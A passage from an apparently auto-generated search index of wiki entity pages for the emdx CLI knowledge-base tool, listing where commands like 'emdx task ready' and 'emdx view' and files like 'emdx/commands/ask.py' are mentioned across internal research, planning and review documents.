\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>get_active_delegate_tasks()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>task_execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/emdx-task-ready/","title":"emdx task ready","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdx-task-ready/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6677 Delegate Slimming Research [2/3]   Section: Conflict 1: \"Check ready tasks\" (Project CLAUDE.md, line 147)</p> <p>Current text: 1. Check ready tasks before starting work: <code>emdx task ready</code></p> </li> <li> <p>#6661 Prime Command Redesign Research [2/3]   Section: Specific problems identified</p> <p>...creates a real risk:</p> </li> <li>The sub-agent reads the rules as an instruction</li> <li>It runs <code>emdx task ready</code> or starts reasoning about which task to pick</li> <li>It may try to update task statuses for tasks it wasn't assigned to</li> <li> <p>At minimum, it burns context window tokens reaso...</p> </li> <li> <p>#6653 Delegate: README Rewrite - Minimal Prose / Max Examples [6/10]   Section: Task</p> <p><code>bash $ emdx task add \"Fix token refresh bug\" --cat FIX $ emdx task add \"Add rate limiting\" --cat FEAT --epic 42 $ emdx task ready $ emdx task active 15 $ emdx task done 15 $ emdx task epic list</code></p> </li> <li> <p>#6649 Delegate: README Tools-It-Replaces Angle [3/10]   Section: emdx</p> <p>...find<code>,</code>emdx tag<code>| | **Task tracker** (Linear, GitHub Issues) |</code>emdx task add<code>,</code>emdx task ready<code>,</code>emdx task epic<code>| | **RAG pipeline** (LangChain, custom scripts) |</code>emdx find --mode semantic<code>,</code>emdx find --ask<code>| | **Agent orchestrator** (CrewAI, AutoGen) |</code>...</p> </li> <li> <p>#6533 EMDX Future Directions: Agent-First Design [1/4]   Section: 4. Discovery of What to Work on Next</p> </li> <li><code>emdx task ready</code> shows unblocked tasks</li> <li><code>emdx prime</code> shows ready tasks + in-progress</li> <li> <p>Priority field exists but rarely set</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: CLI Commands</p> </li> </ul>"},{"location":"entities/emdx-task-ready/#current-state","title":"Current State","text":""},{"location":"entities/emdx-task-ready/#execution","title":"Execution","text":"<p>```bash</p>"},{"location":"entities/emdx-task-ready/#show-ready-tasks","title":"Show ready tasks","text":"<p>emdx task ready</p> <ul> <li>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Agent Patterns <p>Discovery Flow:</p> </li> <li>Start with <code>emdx prime</code> to get work context</li> <li>Consume task queue: <code>emdx task ready</code></li> <li>Direct ID lookup from references</li> <li> <p>Never browse interactively</p> </li> <li> <p>#6185 Gameplan: Simplify Task System for Agent Use   Section: New CLI Surface (4 commands replace 12)</p> <p>...te a task emdx task add \"Implement this\" --doc 42        # Create with doc context emdx task ready                                # Show what's actionable emdx task done 42                              # Mark complete emdx task done 42 --note \"Fixed in PR #123\"...</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Claude Code Integration</p> <p>From <code>CLAUDE.md</code>:</p> </li> <li><code>emdx task ready</code> - Check tasks ready to work</li> <li><code>emdx task create \"Title\" --description \"Details\"</code> - Create tasks for discovered work</li> <li> <p><code>emdx task update &lt;id&gt; -s done</code> - Mark complete</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Task CLI Commands</p> <p>...k create \"Title\"        # Create task emdx task list                  # List tasks emdx task ready                 # Show actionable tasks (open + deps satisfied) emdx task run               # Execute task via Claude emdx task update  -s done   # Change st..."},{"location":"entities/emdx-task-ready/#related-entities","title":"Related Entities","text":"<ul> <li><code>type='single'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>type='group'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>type='chain'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>task creation during delegation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>migration 035</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>migration 034</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>integration with delegate command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>task lifecycle</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>single tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>session-end.sh</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/emdx-view/","title":"emdx view","text":"<p>Type: tech_term | Mentioned in: 13 documents | First seen: 2025-07-07</p>"},{"location":"entities/emdx-view/#documents-13","title":"Documents (13)","text":"<ul> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: 6. Bidirectional Linking: Entity Pages \u2194 Topic Articles</p> </li> <li> <p>#6713 wiki-schema-research   Section: Design Decision: Self-Hosting vs. Separate Tables</p> <p>Pros:</p> </li> <li>Immediately searchable via FTS5, links, tags, embeddings</li> <li>No parallel content system to maintain</li> <li>Wiki articles show up in <code>emdx find</code>, <code>emdx view</code>, link graphs</li> <li> <p>Existing compact command already saves synthesis results as documents</p> </li> <li> <p>#6690 Delegate: Research UX patterns for surfacing multi-method document lin [4/4]   Section: Current State</p> <p>Display surfaces:</p> </li> <li><code>emdx view --links</code> \u2014 flat Rich table, all methods interleaved, sorted by score desc</li> <li><code>_print_related_docs()</code> \u2014 in view header, lists ALL links inline (unbounded)</li> <li> <p>**...</p> </li> <li> <p>#6661 Prime Command Redesign Research [2/3]   Section: Specific problems identified</p> <p>...gned task.\"</p> </li> <li>Remove delegate command reference</li> <li> <p>Keep: <code>emdx save</code>, <code>emdx find</code>, <code>emdx view</code> (the sub-agent may need to search/save)</p> </li> <li> <p>#6477 EMDX Task System: Unified Architecture and Simplification Strategy   Section: Phase 1: Ruthless API Reduction (Immediate)</p> <p>Remove 8 commands (~350 LOC):</p> </li> <li><code>task show</code> \u2192 Use <code>emdx view</code> for linked docs</li> <li><code>task update</code> \u2192 Only status matters, use <code>done</code></li> <li><code>task log</code> \u2192 Document content is the log</li> <li><code>task depends</code> \u2192 Overkill for personal use</li> <li> <p>`task ru...</p> </li> <li> <p>#6397 Delegate: Design a concrete 'dual-interface' architecture for EMDX whe [2/3]   Section: Phase 1: Foundation (Immediate)</p> <p>.....]}` in JSON mode</p> </li> <li><code>emdx find</code> \u2192 already has --json, ensure consistency</li> <li><code>emdx view</code> \u2192 add --json support</li> <li> <p><code>emdx tag</code> \u2192 add --json support</p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: Commands with partial CLI tests:</p> <p>...s flag | | <code>emdx find</code> | Help only | Actual search results, output formatting | | <code>emdx view</code> | Help only | Document display, not-found handling | | <code>emdx delete</code> | Help only | Soft/hard delete, confirmation | | <code>emdx tag</code> | Basic list | Add/remove tags, bat...</p> </li> <li> <p>#6185 Gameplan: Simplify Task System for Agent Use   Section: New CLI Surface (4 commands replace 12)</p> <p>...<code>\u2192 replaced by</code>task add` (simpler name, fewer options)</p> </li> <li><code>task show</code> \u2192 cut (use <code>emdx view</code> for linked docs)</li> <li><code>task update</code> \u2192 cut (only status matters, use <code>done</code>)</li> <li><code>task log</code> \u2192 cut (document/delegate output is the log)</li> <li> <p><code>task depends</code> \u2192 cut (agents don...</p> </li> <li> <p>#6164 Delegate: Audit CLAUDE.md (578 lines) for accuracy. Check: (1) does it [6/17]   Section: Stale References Summary</p> <p>...in the document were verified to exist:</p> </li> <li><code>emdx save</code>, <code>emdx find</code>, <code>emdx list</code>, <code>emdx view</code>, <code>emdx recent</code></li> <li><code>emdx tag add/remove/list/legend</code></li> <li><code>emdx prime</code>, <code>emdx status</code></li> <li><code>emdx task create/ready/...</code></li> <li><code>emdx delegate</code> (with all documented flags)</li> <li> <p>`emd...</p> </li> <li> <p>#6147 Delegate: Review PR #452 (Auto-Linking). Run: gh pr diff 452. Check co [5/7]   Section: Gameplan Alignment \u2705</p> <p>...hook (--auto-link) | <code>emdx save --auto-link</code> flag | \u2705 | | Display links on view | <code>emdx view</code> shows \"Related docs:\" | \u2705 | | <code>emdx links</code> command | <code>emdx ai links &lt;id&gt;</code> with tree view | \u2705 | | Backfill all docs | <code>emdx ai link --all</code> | \u2705 | | Bidirectional link...</p> </li> <li> <p>#6143 Delegate: Read gameplan by running: emdx view 6098. Implement the Auto [2/7]   Section: CLI Commands</p> </li> <li><code>emdx view</code> now shows \"Related docs:\" section at the bottom</li> <li> <p>Can be disabled with <code>--no-links</code> flag</p> </li> <li> <p>#6098 Gameplan #2: Auto-Linking on Save   Section: User Experience</p> </li> </ul> <pre><code>emdx view 6100\n# ... doc content ...\n#\n# Related docs:\n#   #6045 \"API Security Notes\" (82%)\n#   #6023 \"Architecture Decisions\" (67%)\n#   #6011 \"Session Management\" (61%)\n</code></pre> <ul> <li>#191 Pagination Plan for emdx view   Section: Plan for Adding Pagination to emdx view </li> </ul>"},{"location":"entities/emdx-view/#document-entity-needs-implementation","title":"Document \u2192 Entity (needs implementation)","text":"<p>When viewing a document (<code>emdx view 42</code>), add an \"Entities\" section showing extracted entities that have their own pages:</p>"},{"location":"entities/emdx-view/#view-integration","title":"View Integration","text":""},{"location":"entities/emdx-view/#on-view","title":"On view:","text":""},{"location":"entities/emdx-view/#current-issue","title":"Current Issue","text":"<p>When using <code>emdx view</code>, long documents scroll past the terminal window, making it hard to read from the beginning.</p>"},{"location":"entities/emdx-view/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx ai link --all</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>link_all()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>get_links()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>find_similar_documents()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>emdx save --auto-link</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>emdx links</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>emdx cascade add</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>create_links()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>bidirectional links</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>task update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/emdx/","title":"emdx","text":"<p>Type: heading | Mentioned in: 17 documents | First seen: 2025-07-08</p>"},{"location":"entities/emdx/#documents-17","title":"Documents (17)","text":"<ul> <li> <p>#6653 Delegate: README Rewrite - Minimal Prose / Max Examples [6/10]   Section: emdx</p> <p><code>bash uv tool install emdx    # or: pip install emdx</code></p> </li> <li> <p>#6652 Delegate: Document #6643 (README Rewrite Strategy for 0.19.0): META ANGLE [7/10]   Section: The Pitch (30 lines max)</p> <p>```markdown</p> </li> </ul>"},{"location":"entities/emdx/#emdx_1","title":"emdx","text":"<ul> <li> <p>#6650 Delegate: Document #6643 (README Rewrite Strategy for 0.19.0): Knowledge Graph Angle [8/10]   Section: emdx</p> <p>Most AI tools save notes. emdx builds a graph. Every document you save gets auto-linked to related documents by semantic similarity. Every search finds conceptually related content, not just keyword matches. The more you add, the smarter it gets.</p> </li> <li> <p>#6649 Delegate: README Tools-It-Replaces Angle [3/10]   Section: emdx</p> You used to need emdx equivalent Notes app (Notion, Obsidian) <code>emdx save</code>, <code>emdx find</code>, <code>emdx tag</code> Task tracker (Linear, GitHub Issues) <code>emdx task add</code>, `emd... </li> <li> <p>#6648 Delegate: Document #6643 (README Rewrite Strategy for 0.19.0): README [10/10]   Section: emdx</p> <p>```bash</p> </li> </ul>"},{"location":"entities/emdx/#fire-off-5-research-tasks-in-parallel-go-make-coffee","title":"Fire off 5 research tasks in parallel. Go make coffee.","text":"<p>$ emdx delegate \"audit auth\" \"review error handling\" \"check test coverage\" \\                 \"scan for injection bugs\" \"profile hot paths\"</p> <ul> <li> <p>#6598 Delegate synthesis [synthesis]   Section: Executive Summary</p> <p>These four research tasks reveal a cohesive picture: EMDX has powerful capabilities but hides them behind poor first-run experience and documentation. The path forward requires:</p> </li> <li> <p>#6594 Delegate: Research what a great README rewrite for emdx would look lik [1/4]   Section: Executive Summary</p> <p>After analyzing the current EMDX README and studying READMEs from best-in-class CLI tools (ripgrep, bat, jq, httpie, fzf, eza), here's a comprehensive proposal for a rewrite that communicates EMDX's...</p> </li> <li> <p>#6590 Delegate: Research what a great README rewrite for emdx would look lik [1/4]   Section: Executive Summary</p> <p>The current EMDX README is functional but buries the lead. The tagline \"Documentation Index Management System\" (not currently in README, but mentioned as the old one) fails to commun...</p> </li> <li> <p>#6597 Delegate: Research the first-5-minutes experience after 'pip install e [4/4]   Section: Executive Summary</p> <p>After <code>pip install emdx</code>, a new user faces significant friction before reaching their first \"aha moment\". The current experience is optimized for power users with Claude Code integration, not for someone discovering the tool for the first time.</p> </li> <li> <p>#6592 Delegate: Research the first-5-minutes experience after 'pip install e [4/4]   Section: What Happens Today</p> <ol> <li>pip install emdx \u2014 works cleanly, installs quickly</li> </ol> </li> <li>emdx --help \u2014 shows ~23 commands (overwhelming for new user)</li> <li> <p>First command creates DB \u2014 silent migration flood on f...</p> </li> <li> <p>#6480 Delegate: List the top 5 most important files in the emdx project and    Section: Top 5 Most Important Files in the EMDX Project</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Summary</p> <p>Fixed a critical command injection vulnerability (CVE-level severity) in the <code>emdx delegate --each</code> flag, as identified in security audit document #6230.</p> </li> <li> <p>#288 emdx 0.2.0 Debugging Adventure</p> <p>Successfully implemented edit/delete functionality for emdx with soft delete support, but ran into a tricky Python import issue where the wrong version was being loaded depending on the current directory.</p> </li> <li> <p>#289 README   Section: Features</p> <ul> <li>\ud83d\ude80 Unified CLI: Single <code>emdx</code> command with intuitive subcommands</li> </ul> </li> <li>\ud83d\udd0d Full-Text Search: SQLite FTS5-powered search with ranking and fuzzy matching</li> <li> <p>\ud83d\udcdd Multiple Input Methods: Save files,...</p> </li> <li> <p>#6191 Delegate: analysis [3/3]   Section: Project Overview</p> <p>EMDX (Documentation Index Management System) is a powerful knowledge base CLI tool built in Python. It provides full-text search, tagging, project organization, and mul...</p> </li> <li> <p>#6158 Delegate: analysis [5/5]   Section: Project Overview</p> <p>EMDX (Documentation Index Management System) is a powerful command-line knowledge base and documentation management system built in Python. Version 0.14.0.</p> </li> </ul>"},{"location":"entities/emdx/#1-emdxmainpy","title":"1. <code>emdx/main.py</code>","text":"<p>The main CLI entry point that defines the <code>emdx</code> command, registers all subcommands (save, find, view, delegate, cascade, etc.), handles lazy loading for heavy features, and implements safe mode for disabling execution commands.</p>"},{"location":"entities/emdx/#related-entities","title":"Related Entities","text":"<ul> <li><code>aha moment</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>why this angle works</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>why emdx?</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>try it in 30 seconds</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>tools handle first run</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>the pitch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>specific recommendations</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>see it in action</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>rewrite research</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>proposed new structure</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/emdxcommandsaskpy/","title":"emdx/commands/ask.py","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxcommandsaskpy/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6694 Fix emdx delete auto-confirm for non-TTY   Section: What was done</p> <p>...confirmations | | <code>emdx/commands/compact.py</code> | Guard synthesis confirmations | | <code>emdx/commands/ask.py</code> | Guard clear-index confirmation | | <code>tests/test_commands_core.py</code> | Added 2 new tests for non-TTY auto-confirm | | <code>tests/test_commands_trash.py</code> | Fixed 1 existin...</p> </li> <li> <p>#6687 Fix emdx delete auto-confirm for non-TTY   Section: Changes</p> <p>...firmations</p> </li> <li><code>emdx/commands/compact.py</code> \u2014 synthesis confirmations (2 locations)</li> <li><code>emdx/commands/ask.py</code> \u2014 <code>ai clear-index</code> confirmation</li> <li> <p><code>emdx/commands/maintain.py</code> \u2014 all <code>Confirm.ask</code> and <code>typer.confirm</code> calls (6 locations)</p> </li> <li> <p>#6525 Delegate: FEAT-7 Ask-KB Improvements Implementation   Section: Phase 1: Core Filters</p> <p>Files Modified:</p> </li> <li><code>emdx/commands/ask.py</code> - Added CLI options</li> <li> <p><code>emdx/services/ask_service.py</code> - Added filter helper</p> </li> <li> <p>#6523 Gameplan: FEAT-7 Ask-KB Improvements   Section: Phase 1: Core Filters (HIGH priority)</p> <p>...<code>--tags</code> filter</p> </li> <li>Add <code>--tags</code> option to <code>ask_question()</code> and <code>get_context()</code> in <code>emdx/commands/ask.py</code></li> <li>Create <code>_add_filters(query, tags, recent_days)</code> helper in <code>emdx/services/ask_service.py</code></li> <li>Filter docs by joining <code>document_tags</code> table</li> <li> <p>Use `normalize_tag_to_em...</p> </li> <li> <p>#6521 Delegate synthesis [synthesis]   Section: Files to Modify</p> <p>...mmands/prime.py<code>| Add</code>_get_git_context()<code>,</code>_get_key_docs()<code>, relative time | |</code>emdx/commands/ask.py<code>| Add</code>--tags<code>,</code>--recent<code>options, update display | |</code>emdx/services/ask_service.py<code>| Add</code>_add_filters()<code>helper, enhance</code>Answer<code>dataclass | |</code>tests/test_prim...</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: Files to Modify</p> <ol> <li><code>emdx/commands/ask.py</code> \u2014 Add options, update display</li> </ol> </li> <li><code>emdx/services/ask_service.py</code> \u2014 Add filter helper, update Answer dataclass, enhance methods</li> <li> <p><code>tests/test_ask.py</code> \u2014 Create new test file (port from PR #453 with updates)</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 6. DUPLICATE IMPORTS (Code Quality)</p> <p>...and`</p> </li> <li><code>emdx/commands/executions.py</code> - Duplicates: <code>psutil</code>, <code>ExecutionMonitor</code></li> <li><code>emdx/commands/ask.py</code> - Duplicates: <code>AskService</code>, <code>EmbeddingService</code> (5x)</li> <li> <p><code>emdx/commands/maintain.py</code> - Duplicates: <code>Progress</code>, <code>SpinnerColumn</code>, <code>TextColumn</code>, <code>psutil</code>, `get_running_ex...</p> </li> <li> <p>#6151 Delegate: Review PR #453 (Ask the KB). Run: gh pr diff 453. Check code [6/7]   Section: Test Coverage</p> </li> <li><code>emdx/commands/ask.py</code>: +53 lines (new CLI options, machine output)</li> <li><code>emdx/services/ask_service.py</code>: +127 lines, -56 lines (filtering, citations, prompts)</li> <li> <p>Total: 2 files, +180/-56 lines</p> </li> <li> <p>#6144 Delegate: Read gameplan by running: emdx view 6103. Implement the Ask  [7/7]   Section: Ask the KB Feature Implementation Complete</p> </li> <li>Updated <code>emdx/commands/ask.py</code> \u2014 added new CLI options and output formatting</li> <li> <p>Updated <code>emdx/services/ask_service.py</code> \u2014 added filtering logic and enhanced Answer dataclass</p> </li> <li> <p>#6143 Delegate: Read gameplan by running: emdx view 6098. Implement the Auto [2/7]   Section: CLI Commands</p> <p>...0 lines)</p> </li> <li><code>emdx/commands/core.py</code> \u2014 Added --auto-link flag, view links display</li> <li> <p><code>emdx/commands/ask.py</code> \u2014 Added links, link, link-stats commands</p> </li> <li> <p>#6429 Delegate: Task #359: Fix Semantic Find CI failures. The branch feat/se [2/2]   Section: Key Changes</p> </li> <li>emdx/commands/ask.py: Kept chunk indexing features from feat/semantic-find, applied line length fixes</li> <li> <p>emdx/commands/core.py: Kept hybrid search code from feat/semantic-find, reso...</p> </li> <li> <p>#6354 Delegate: Rebase the feat/ask-kb branch onto main and resolve all merg [4/5]   Section: Rebase Result: feat/ask-kb onto main (PR #453)</p> </li> <li>emdx/commands/ask.py - Type hint style conflict (Optional[str] vs str | None) and new filter parameters</li> <li>emdx/services/ask_service.py - Same type hint conflict plus new parameters</li> </ul>"},{"location":"entities/emdxcommandsaskpy/#changes-summary","title":"Changes Summary","text":""},{"location":"entities/emdxcommandsaskpy/#changes-made","title":"Changes Made","text":""},{"location":"entities/emdxcommandsaskpy/#merge-conflict-resolution","title":"Merge Conflict Resolution","text":""},{"location":"entities/emdxcommandsaskpy/#conflicts-resolved","title":"Conflicts Resolved","text":"<p>Two files had merge conflicts:</p>"},{"location":"entities/emdxcommandsaskpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>--recent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.1)</li> <li><code>source_titles: list[tuple[int, str]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>recent_days</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>confidence indicator</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>enhanced output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>emdx ai context</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>core filters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>context budget</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>concise system prompts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>ask()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/emdxcommandscascadepy/","title":"emdx/commands/cascade.py","text":"<p>Type: tech_term | Mentioned in: 13 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxcommandscascadepy/#documents-13","title":"Documents (13)","text":"<ul> <li>#6530 Delegate: Review GitHub PR #651 using 'gh pr view 651' and 'gh pr diff [2/4]   Section: \u2705 Strengths <ol> <li>Clean removal: The PR removes all related code comprehensively:</li> </ol> </li> <li><code>emdx/commands/cascade.py</code> (783 lines)</li> <li><code>emdx/database/cascade.py</code> (375 lines)</li> <li><code>emdx/services/cascade_service.py</code> (195 lines)</li> <li> <p><code>emdx/ui/cascade/</code> directory (6 files, ~1,175 lines...</p> </li> <li> <p>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files</p> </li> <li><code>emdx/commands/cascade.py</code> - Uses CASCADE_*_TIMEOUT constants</li> <li><code>emdx/commands/delegate.py</code> - Uses DELEGATE_TIMEOUT_SECONDS, DISCOVERY_TIMEOUT_SECONDS</li> <li> <p><code>emdx/commands/gist.py</code> - Uses GITHUB_...</p> </li> <li> <p>#6362 Delegate: DEBT-5: Fix silent exception handlers in the emdx codebase.  [2/3]   Section: DEBT-5: Fix Silent Exception Handlers</p> </li> <li><code>emdx/commands/cascade.py</code> - typer.Exit handling in auto-run</li> <li><code>emdx/commands/recipe.py</code> - ValueError on non-numeric ID lookup</li> <li> <p><code>emdx/services/ask_service.py</code> - ValueError on invalid doc I...</p> </li> <li> <p>#6361 Delegate: DEBT-7: Centralize configuration constants in emdx. Currentl [1/2]   Section: 2. Updated files to use centralized constants:</p> <p>...nstants | | <code>emdx/services/claude_executor.py</code> | Use CLI_SYNC_DEFAULT_TIMEOUT | | <code>emdx/commands/cascade.py</code> | Use STAGE_*_TIMEOUT constants | | <code>emdx/services/unified_executor.py</code> | Use CLI_SYNC_DEFAULT_TIMEOUT | | <code>emdx/services/ask_service.py</code> | Use DEFAULT_CLAUDE_SONNE...</p> </li> <li> <p>#6351 Delegate: Analyze upgrading typer from ^0.15.0 to ^0.23.1 for the emdx [1/2]   Section: 2.1 <code>typing.Literal</code> Support (v0.19.0)</p> <p>Files that could benefit:</p> </li> <li><code>emdx/commands/core.py</code> (group_role parameter)</li> <li><code>emdx/commands/tags.py</code> (tag operations)</li> <li> <p><code>emdx/commands/cascade.py</code> (cascade stage options)</p> </li> <li> <p>#6292 DEBT-17: Add cascade command test coverage   Section: DEBT-17: Add Missing Test Coverage for Cascade Commands</p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: Changes Made</p> </li> <li><code>emdx/commands/cascade.py</code> - Uses CASCADE_*_TIMEOUT_SECONDS</li> 